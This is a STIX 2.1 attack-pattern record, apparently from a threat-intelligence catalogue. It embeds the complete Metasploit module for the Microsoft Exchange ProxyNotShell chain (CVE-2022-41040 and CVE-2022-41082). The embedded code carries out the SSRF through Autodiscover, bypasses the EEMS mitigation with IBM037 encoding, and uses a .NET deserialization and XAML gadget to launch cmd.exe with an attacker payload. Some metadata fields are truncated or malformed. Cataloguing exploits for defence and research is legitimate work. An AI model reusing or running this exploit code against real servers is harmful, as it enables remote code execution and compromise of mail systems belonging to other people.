{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c1fe7cdf-a4a5-4281-ad23-25a25ae7109e",
    "created": "2024-08-14T16:54:48.967454Z",
    "modified": "2024-08-14T16:54:48.967458Z",
    "name": "Microsoft Exchange ProxyNotShell RCE",
    "description": " This module chains two vulnerabilities on Microsoft Exchange Server that, when combined, allow an authenticated attacker to interact with",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/exchange_proxynotshell_rce.rb",
            "external_id": "exchange_proxynotshell_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend"
        },
        {
            "source_name": "reference",
            "url": "https://msrc-blog.microsoft.com/2022/09/29/customer-guidance-for-reported-zero-day-vulnerabilities-in-microsoft-exchange-server/"
        },
        {
            "source_name": "reference",
            "url": "https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9"
        },
        {
            "source_name": "reference",
            "url": "https://rw.md/2022/11/09/ProxyNotRelay.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HTTP::Exchange\n  include Msf::Exploit::Remote::HTTP::Exchange::ProxyMaybeShell\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Exchange ProxyNotShell RCE',\n        'Description' => %q{\n          This module chains two vulnerabilities on Microsoft Exchange Server\n          that, when combined, allow an authenticated attacker to interact with\n          the Exchange Powershell backend (CVE-2022-41040), where a\n          deserialization flaw can be leveraged to obtain code execution\n          (CVE-2022-41082). This exploit only support Exchange Server 2019.\n\n          These vulnerabilities were patched in November 2022.\n        },\n        'Author' => [\n          'Orange Tsai', # Discovery of ProxyShell SSRF\n          'Spencer McIntyre', # Metasploit module\n          'DA-0x43-Dx4-DA-Hx2-Tx2-TP-S-Q', # Vulnerability analysis\n          'Piotr Bazyd\u0142o', # Vulnerability analysis\n          'Rich Warren', # EEMS bypass via ProxyNotRelay\n          'Soroush Dalili' # EEMS bypass\n        ],\n        'References' => [\n          [ 'CVE', '2022-41040' ], # ssrf\n          [ 'CVE', '2022-41082' ], # rce\n          [ 'URL', 'https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend' ],\n          [ 'URL', 'https://msrc-blog.microsoft.com/2022/09/29/customer-guidance-for-reported-zero-day-vulnerabilities-in-microsoft-exchange-server/' ],\n          [ 'URL', 'https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9' ],\n          [ 'URL', 'https://rw.md/2022/11/09/ProxyNotRelay.html' ]\n        ],\n        'DisclosureDate' => '2022-09-28', # announcement of limited details, patched 2022-11-08\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Platform' => ['windows'],\n        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'windows',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Type' => :windows_dropper\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'windows',\n              'Arch' => [ARCH_CMD],\n              'Type' => :windows_command\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'AKA' => ['ProxyNotShell'],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('USERNAME', [ true, 'A specific username to authenticate as' ]),\n      OptString.new('PASSWORD', [ true, 'The password to authenticate with' ]),\n      OptString.new('DOMAIN', [ false, 'The domain to authenticate to' ])\n    ])\n\n    register_advanced_options([\n      OptEnum.new('EemsBypass', [ true, 'Technique to bypass the EEMS rule', 'IBM037v1', %w[IBM037v1 none]])\n    ])\n  end\n\n  def check\n    @ssrf_email ||= Faker::Internet.email\n    res = send_http('GET', '/mapi/nspi/')\n    return CheckCode::Unknown if res.nil?\n    return CheckCode::Unknown('Server responded with 401 Unauthorized.') if res.code == 401\n    return CheckCode::Safe unless res.code == 200 && res.get_html_document.xpath('//head/title').text == 'Exchange MAPI/HTTP Connectivity Endpoint'\n\n    # actually run the powershell cmdlet and see if it works, this will fail if:\n    #   * the credentials are incorrect (USERNAME, PASSWORD, DOMAIN)\n    #   * the exchange emergency mitigation service M1 rule is in place\n    return CheckCode::Safe unless execute_powershell('Get-Mailbox')\n\n    CheckCode::Vulnerable\n  rescue Msf::Exploit::Failed => e\n    CheckCode::Safe(e.to_s)\n  end\n\n  def ibm037(string)\n    string.encode('IBM037').force_encoding('ASCII-8BIT')\n  end\n\n  def send_http(method, uri, opts = {})\n    opts[:authentication] = {\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD'],\n      'preferred_auth' => 'NTLM'\n    }\n\n    if uri =~ /powershell/i && datastore['EemsBypass'] == 'IBM037v1'\n      uri = \"/Autodiscover/autodiscover.json?#{ibm037(@ssrf_email + uri + '?')}&#{ibm037('Email')}=#{ibm037('Autodiscover/autodiscover.json?' + @ssrf_email)}\"\n      opts[:headers] = {\n        'X-Up-Devcap-Post-Charset' => 'IBM037',\n        # technique needs the \"UP\" prefix, see: https://github.com/Microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System/net/System/Net/HttpListenerRequest.cs#L362\n        'User-Agent' => \"UP #{datastore['UserAgent']}\"\n      }\n    else\n      uri = \"/Autodiscover/autodiscover.json?#{@ssrf_email + uri}?&Email=Autodiscover/autodiscover.json?#{@ssrf_email}\"\n    end\n\n    super(method, uri, opts)\n  end\n\n  def exploit\n    # if we're doing pre-exploit checks, make sure the target is Exchange Server 2019 because the XamlGadget does not\n    # work on Exchange Server 2016\n    if datastore['AutoCheck'] && !datastore['ForceExploit'] && (version = exchange_get_version)\n      vprint_status(\"Detected Exchange version: #{version}\")\n      if version < Rex::Version.new('15.2')\n        fail_with(Failure::NoTarget, 'This exploit is only compatible with Exchange Server 2019 (version 15.2)')\n      end\n    end\n\n    @ssrf_email ||= Faker::Internet.email\n\n    case target['Type']\n    when :windows_command\n      vprint_status(\"Generated payload: #{payload.encoded}\")\n      execute_command(payload.encoded)\n    when :windows_dropper\n      execute_cmdstager({ linemax: 7_500 })\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    xaml = Nokogiri::XML(<<-XAML, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root\n      <ResourceDictionary\n        xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\n        xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\n        xmlns:System=\"clr-namespace:System;assembly=mscorlib\"\n        xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">\n        <ObjectDataProvider x:Key=\"LaunchCalch\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\">\n          <ObjectDataProvider.MethodParameters>\n            <System:String>cmd.exe</System:String>\n            <System:String>/c #{cmd.encode(xml: :text)}</System:String>\n          </ObjectDataProvider.MethodParameters>\n        </ObjectDataProvider>\n      </ResourceDictionary>\n    XAML\n\n    identity = Nokogiri::XML(<<-IDENTITY, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root\n      <Obj N=\"V\" RefId=\"14\">\n        <TN RefId=\"1\">\n        <T>System.ServiceProcess.ServiceController</T>\n          <T>System.Object</T>\n        </TN>\n        <ToString>Object</ToString>\n        <Props>\n          <S N=\"Name\">Type</S>\n          <Obj N=\"TargetTypeForDeserialization\">\n            <TN RefId=\"1\">\n              <T>System.Exception</T>\n              <T>System.Object</T>\n            </TN>\n            <MS>\n              <BA N=\"SerializationData\">\n                #{Rex::Text.encode_base64(XamlLoaderGadget.generate.to_binary_s)}\n              </BA>\n            </MS>\n          </Obj>\n        </Props>\n        <S>\n          <![CDATA[#{xaml}]]>\n        </S>\n      </Obj>\n    IDENTITY\n\n    execute_powershell('Get-Mailbox', args: [\n      { name: '-Identity', value: identity }\n    ])\n  end\nend\n\nclass XamlLoaderGadget < Msf::Util::DotNetDeserialization::Types::SerializedStream\n  include Msf::Util::DotNetDeserialization\n\n  def self.generate\n    from_values([\n      Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),\n      Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(\n        class_info: Types::General::ClassInfo.new(\n          obj_id: 1,\n          name: 'System.UnitySerializationHolder',\n          member_names: %w[Data UnityType AssemblyName]\n        ),\n        member_type_info: Types::General::MemberTypeInfo.new(\n          binary_type_enums: %i[String Primitive String],\n          additional_infos: [ 8 ]\n        ),\n        member_values: [\n          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(\n            obj_id: 2,\n            string: 'System.Windows.Markup.XamlReader'\n          )),\n          4,\n          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(\n            obj_id: 3,\n            string: 'PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'\n          ))\n        ]\n      ),\n      Types::RecordValues::MessageEnd.new\n    ])\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-09-28, # announcement of limited details, patched 2022-11-08",
    "x_mitre_platforms": [
        "windows'"
    ]
}